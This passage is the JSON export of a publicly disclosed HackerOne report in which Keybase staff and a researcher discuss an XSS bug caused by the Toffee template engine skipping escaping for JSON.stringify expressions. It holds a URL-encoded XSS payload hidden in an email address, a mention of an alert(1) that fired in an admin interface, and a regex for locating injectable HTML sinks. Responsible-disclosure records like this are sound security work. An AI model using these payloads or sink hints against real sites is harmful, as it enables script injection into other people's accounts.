class=\"nx\"\u003ereformatted\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"nx\"\u003eJSON\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003estringify\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nx\"\u003eJSON\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003eparse\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nx\"\u003esig\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003epayload_json\u003c/span\u003e\u003cspan class=\"p\"\u003e),\u003c/span\u003e \u003cspan class=\"kc\"\u003enull\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"mi\"\u003e2\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\n                \u003cspan class=\"c1\"\u003e// ...\u003c/span\u003e\n                \u003cspan class=\"nx\"\u003e_to\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"s1\"\u003e      \u0026lt;textarea wrap=\u0026quot;off\u0026quot; class=\u0026quot;form-control fixed full-payload autoselect\u0026quot; rows=\u0026quot;20\u0026quot; autocapitalize=\u0026quot;off\u0026quot; autocorrect=\u0026quot;off\u0026quot; autocomplete=\u0026quot;off\u0026quot; spellcheck=\u0026quot;false\u0026quot; readonly\u0026gt;\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\n                \u003cspan class=\"nx\"\u003e_to\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026quot;\u0026quot;\u003c/span\u003e \u003cspan class=\"o\"\u003e+\u003c/span\u003e \u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nx\"\u003ereformatted\u003c/span\u003e \u003cspan class=\"o\"\u003e!=\u003c/span\u003e \u003cspan class=\"kc\"\u003enull\u003c/span\u003e \u003cspan class=\"p\"\u003e?\u003c/span\u003e \u003cspan class=\"nx\"\u003eescape\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nx\"\u003ereformatted\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e \u003cspan class=\"p\"\u003e:\u003c/span\u003e \u003cspan class=\"dl\"\u003e\u0026quot;\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e));\u003c/span\u003e\n                \u003cspan class=\"nx\"\u003e_to\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026quot;\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026lt;/textarea\u0026gt;\u003c/span\u003e\u003cspan class=\"se\"\u003e\\n\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eYep, this looks correct and \u003ca href=\"/redirect?url=https%3A%2F%2Fkeybase.io%2Flargenotesting%2Fsigchain%238c8eec6dc19890f759ad2461514794c2f61b856937636d277c88106f1f842b430f\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ethe bug no longer repros\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e. \u003c/p\u003e\n\n\u003cp\u003eThe hotfix confused me at first, but I\u0026#39;m guessing this has to do with \u003ca href=\"/redirect?url=https%3A%2F%2Fgithub.com%2Fmalgorithms%2Ftoffee%2Fblob%2F5fd1722a1dbbdf3c42ed18b505c186888bfef390%2Fsrc%2Fview.coffee%23L360\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003eToffee bypassing autoescaping if the interpolated expression starts with \u003ccode\u003eJSON.stringify\u003c/code\u003e\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e, and the fix would be to wrap it in \u003ccode\u003e__toffee.json\u003c/code\u003e\u0026#39;s escaping logic?\u003c/p\u003e\n","automated_response":false,"created_at":"2017-07-03T00:28:11.202Z","updated_at":"2017-07-03T00:29:13.829Z","actor":{"username":"jordanmilne","cleared":false,"url":"/jordanmilne","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/002/447/d7846c3a70ff69fbfa83f43531b3ca68c55545df_original.JPG/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"keybase","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1802848,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"excellent - yeah, exactly re: the JSON.stringify being whitgelisted to bypass the standard toffee escaping. I might disable that feature since I misused it here and I'm not sure if it's in active use by anyone, really. anyway, thanks!","markdown_message":"\u003cp\u003eexcellent - yeah, exactly re: the JSON.stringify being whitgelisted to bypass the standard toffee escaping. I might disable that feature since I misused it here and I\u0026#39;m not sure if it\u0026#39;s in active use by anyone, really. anyway, thanks!\u003c/p\u003e\n","automated_response":false,"created_at":"2017-07-05T00:06:30.983Z","updated_at":"2017-07-05T00:06:30.983Z","actor":{"username":"chriscoyne","cleared":false,"url":"/chriscoyne","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"keybase","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":1822817,"is_internal":false,"editable":false,"type":"Activities::BountyAwarded","message":"hey jordanmilne - you're MVP.  Attaching an extra $1500 to this because a similar bug allowed you to get an alert into an admin-only interface. (the one with the image HTML embedded into the email address)...funny, I was about to catch it thanks to this ticket leading me to review similar calls, and when I went to the admin interface, I was faced with an alert(1)! anyway, big thanks!\n","markdown_message":"\u003cp\u003ehey jordanmilne - you\u0026#39;re MVP.  Attaching an extra $1500 to this because a similar bug allowed you to get an alert into an admin-only interface. (the one with the image HTML embedded into the email address)...funny, I was about to catch it thanks to this ticket leading me to review similar calls, and when I went to the admin interface, I was faced with an alert(1)! anyway, big thanks!\u003c/p\u003e\n","automated_response":false,"created_at":"2017-07-10T18:56:09.539Z","updated_at":"2017-07-10T18:56:09.539Z","actor":{"url":"/keybase","ibb":false,"profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/002/809/710eb42880bb34c06cab0d1d5081488ec59aec5e_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"profile":{"name":"Keybase"}},"bounty_amount":"1500.0","bounty_currency":"usd","bonus_amount":"0.0","genius_execution_id":null,"team_handle":"keybase","collaborator":{"username":"jordanmilne","url":"/jordanmilne"},"actor_is_team_member":true,"actor_is_concealed_member":false},{"id":1823368,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Thanks Chris!\n\nI'm sure you've noticed by now, but there are a number of other output sanitization issues in the admin UI. I saw that the hotfix involved manually escaping the affected fields before concatenation, but you should consider moving to something safer for ad-hoc HTML templating. IMO manual HTML templating using string concatenation is a code smell and it leads to lots of subtle vulnerabilities like these.\n\nSearching for `\\.((append|prepend|html)\\(|innerHTML\\s*=).*['\"].*\\+` in the compiled JS should bring up a few other problem areas, at least one of which can be abused to achieve reflected DOM-Based XSS (the `window.location.href` one.)\n\nIn projects that I maintain I like to use something like Django's [`format_html`](https://docs.djangoproject.com/en/1.11/ref/utils/#django.utils.html.format_html) for ad-hoc HTML templating since it will escape all input by default. For ES6 I usually use [a string interpolation helper that has opt-out escaping](https://gist.github.com/JordanMilne/f92252a29ba0ccf0830b1203c301dd46). It should work in CoffeeScript as well, but I think the IcedCoffeeScript fork is too old  so you may have to use an API more like `format_html`. I personally prefer the ES6 format string helpers because it's pretty trivial to convert to from existing code that uses string concatenation for HTML templating.\n\nFun fact though, that [email address is actually valid](http://code.iamcal.com/php/rfc822/demo.php?e=%22%3Cimg%2Fsrc%3D%27%2F%2Fsaynotolinux.com%2Ffoo%27onerror%3D%27console.log%281%29%27%3E%22%40saynotolinux.com) per the RFCs, but pretty much no MTA in production will accept it. So few people comply with the spec that simple regex-based validation is usually *less* wrong than a fully spec-compliant email validation function.\n\nJust let me know if you'd like more details!\n\\- Jordan","markdown_message":"\u003cp\u003eThanks Chris!\u003c/p\u003e\n\n\u003cp\u003eI\u0026#39;m sure you\u0026#39;ve noticed by now, but there are a number of other output sanitization issues in the admin UI. I saw that the hotfix involved manually escaping the affected fields before concatenation, but you should consider moving to something safer for ad-hoc HTML templating. IMO manual HTML templating using string concatenation is a code smell and it leads to lots of subtle vulnerabilities like these.\u003c/p\u003e\n\n\u003cp\u003eSearching for \u003ccode\u003e\\.((append|prepend|html)\\(|innerHTML\\s*=).*[\u0026#39;\u0026quot;].*\\+\u003c/code\u003e in the compiled JS should bring up a few other problem areas, at least one of which can be abused to achieve reflected DOM-Based XSS (the \u003ccode\u003ewindow.location.href\u003c/code\u003e one.)\u003c/p\u003e\n\n\u003cp\u003eIn projects that I maintain I like to use something like Django\u0026#39;s \u003ca href=\"/redirect?url=https%3A%2F%2Fdocs.djangoproject.com%2Fen%2F1.11%2Fref%2Futils%2F%23django.utils.html.format_html\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003e\u003ccode\u003eformat_html\u003c/code\u003e\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e for ad-hoc HTML templating since it will escape all input by default. For ES6 I usually use \u003ca href=\"/redirect?url=https%3A%2F%2Fgist.github.com%2FJordanMilne%2Ff92252a29ba0ccf0830b1203c301dd46\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ea string interpolation helper that has opt-out escaping\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e. It should work in CoffeeScript as well, but I think the IcedCoffeeScript fork is too old  so you may have to use an API more like \u003ccode\u003eformat_html\u003c/code\u003e. I personally prefer the ES6 format string helpers because it\u0026#39;s pretty trivial to convert to from existing code that uses string concatenation for HTML templating.\u003c/p\u003e\n\n\u003cp\u003eFun fact though, that \u003ca href=\"/redirect?url=http%3A%2F%2Fcode.iamcal.com%2Fphp%2Frfc822%2Fdemo.php%3Fe%3D%2522%253Cimg%252Fsrc%253D%2527%252F%252Fsaynotolinux.com%252Ffoo%2527onerror%253D%2527console.log%25281%2529%2527%253E%2522%2540saynotolinux.com\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003eemail address is actually valid\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e per the RFCs, but pretty much no MTA in production will accept it. So few people comply with the spec that simple regex-based validation is usually \u003cem\u003eless\u003c/em\u003e wrong than a fully spec-compliant email validation function.\u003c/p\u003e\n\n\u003cp\u003eJust let me know if you\u0026#39;d like more details!\u003cbr\u003e\n- Jordan\u003c/p\u003e\n","automated_response":false,"created_at":"2017-07-10T22:49:44.493Z","updated_at":"2017-07-10T22:49:44.493Z","actor":{"username":"jordanmilne","cleared":false,"url":"/jordanmilne","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/002/447/d7846c3a70ff69fbfa83f43531b3ca68c55545df_original.JPG/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"keybase","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1886622,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hi Folks,\n\nLooks like both issues I pointed out have been mitigated, should this be marked as resolved or is there some other action being taken?\n\nCheers,\n\\-Jordan","markdown_message":"\u003cp\u003eHi Folks,\u003c/p\u003e\n\n\u003cp\u003eLooks like both issues I pointed out have been mitigated, should this be marked as resolved or is there some other action being taken?\u003c/p\u003e\n\n\u003cp\u003eCheers,\u003cbr\u003e\n-Jordan\u003c/p\u003e\n","automated_response":false,"created_at":"2017-08-02T23:16:37.050Z","updated_at":"2017-08-02T23:16:37.050Z","actor":{"username":"jordanmilne","cleared":false,"url":"/jordanmilne","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/002/447/d7846c3a70ff69fbfa83f43531b3ca68c55545df_original.JPG/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"keybase","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1889814,"is_internal":false,"editable":false,"type":"Activities::BugResolved","message":"","markdown_message":"","automated_response":false,"created_at":"2017-08-03T16:01:50.034Z","updated_at":"2017-08-03T16:01:50.034Z","actor":{"username":"maxtaco","cleared":false,"url":"/maxtaco","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":false},"reporter":{"username":"jordanmilne","url":"/jordanmilne"},"genius_execution_id":null,"team_handle":"keybase","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":1941310,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"","markdown_message":"","automated_response":false,"created_at":"2017-08-20T03:34:45.270Z","updated_at":"2017-08-20T03:34:45.270Z","first_to_agree":true,"actor":{"username":"jordanmilne","cleared":false,"url":"/jordanmilne","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/002/447/d7846c3a70ff69fbfa83f43531b3ca68c55545df_original.JPG/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"keybase","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":4319285,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hi folks! Would it be fine to disclose this?","markdown_message":"\u003cp\u003eHi folks! Would it be fine to disclose this?\u003c/p\u003e\n","automated_response":false,"created_at":"2019-03-13T21:14:56.254Z","updated_at":"2019-03-13T21:14:56.254Z","actor":{"username":"jordanmilne","cleared":false,"url":"/jordanmilne","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/002/447/d7846c3a70ff69fbfa83f43531b3ca68c55545df_original.JPG/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"keybase","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":4323386,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"","markdown_message":"","automated_response":false,"created_at":"2019-03-14T15:15:33.053Z","updated_at":"2019-03-14T15:15:33.053Z","actor":{"username":"maxtaco","cleared":false,"url":"/maxtaco","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"keybase","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":4323387,"is_internal":false,"editable":false,"type":"Activities::ReportBecamePublic","message":"","markdown_message":"","automated_response":false,"created_at":"2019-03-14T15:15:33.162Z","updated_at":"2019-03-14T15:15:33.162Z","actor":{"username":"maxtaco","cleared":false,"url":"/maxtaco","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"keybase","actor_is_team_member":true,"actor_is_concealed_member":false}],"activity_page_count":1,"activity_page_number":1,"summaries":[{"category":"team","can_view?":true,"can_create?":false},{"category":"researcher","can_view?":true,"can_create?":false}]}